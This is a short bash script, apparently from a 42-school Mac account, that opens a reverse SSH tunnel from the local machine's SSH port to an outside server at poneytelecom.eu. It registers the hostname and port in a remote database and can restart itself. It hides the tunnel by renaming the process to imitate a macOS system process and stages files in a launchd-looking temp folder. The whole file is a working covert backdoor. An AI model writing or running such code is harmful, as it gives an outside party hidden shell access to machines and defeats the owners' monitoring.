#!/bin/bash
#1.013
cd ~
rev='com.apple.DataDetectorsDynamicData PATH=/usr/bin:/bin:/usr/sbin:/sbin __LAUNCHD_FD=102 HOME=/nfs/zfs-student-3/users/2013/nsaintot TMP=/var/folders/zz/zyxvpxvq6csfxvn_n0000p3w0005hz/T/'
user=eoj
dns=62-210-236-155.rev.poneytelecom.eu
cpt=$(hostname | cut -d . -f1)
arg="$@"
i=0
mkdir .tmp 2>/dev/null
if [ "$arg" == "auto" ]; then
	i=1
	if [ -f .tmp/pid ]; then
		arg="stop"
	else
		arg="start"
	fi
fi
if [ "$arg" == "start" ] && [ -f .tmp/pid ]; then
	echo "Pid already started"
	exit -1
fi
if [ "$arg" == "start" ] && [ ! -f .tmp/pid ]; then
	p=$(jot -r 1 30000 40000)
	echo "$(date) -----------------" >> .tmp/sslog.txt
	echo "$(cat ~/42/scripts/tl/oob/wl.sh ~/42/scripts/tl/oob/lw.sh | /sbin/md5)" > .tmp/md5
	exec -a "$rev" ssh -vvvNRf $p\:localhost:22 $user@$dns >> .tmp/sslog.txt 2>&1 &
	if [ ! "$!" ]; then echo -e "\033[0;31mError" ; exit 0 ; fi
	echo "$!" > .tmp/pid
	echo -e "Port: $p"
	echo -e "Copy scripts.."
#	mkdir -p /tmp/launchd-1934.27hX1337iq/ 2>/dev/null ; chmod 777 /tmp/launchd-1934.27hX1337iq/ ; cp ~/tl/oob/wl.sh ~/tl/oob/lw.sh /tmp/launchd-1934.27hX1337iq/ ; chmod 755 /tmp/launchd-1934.27hX1337iq/*.sh
	exec -a "$rev" ssh $user@$dns "if cat ~/joe/db | grep $cpt >/dev/null;then sed -i \"/$cpt/c\\$cpt\t1\t$p\" ~/joe/db; else printf \"$cpt\t1\t$p\n\" >> ~/joe/db; fi" &
elif [ "$arg" == "stop" ]; then
	if [ -f .tmp/pid ]; then
		pid=$(cat .tmp/pid)
		kill -9 $pid
		echo -e "Pid: $pid killed"
		if [ $i -eq 1 ]; then cat .tmp/sslog.txt; fi
		rm .tmp/pid .tmp/sslog.txt /tmp/launchd-1934.27hX1337iq/wl.sh /tmp/launchd-1934.27hX1337iq/lw.sh 2>/dev/null
		if [ $i -eq 1 ]; then
			./$0 start &
		fi
		exit 0
	fi
	echo -e "No Reverse pid found"
	exit -1
else
	echo "Usage: oob.sh <start|auto|stop>"
fi
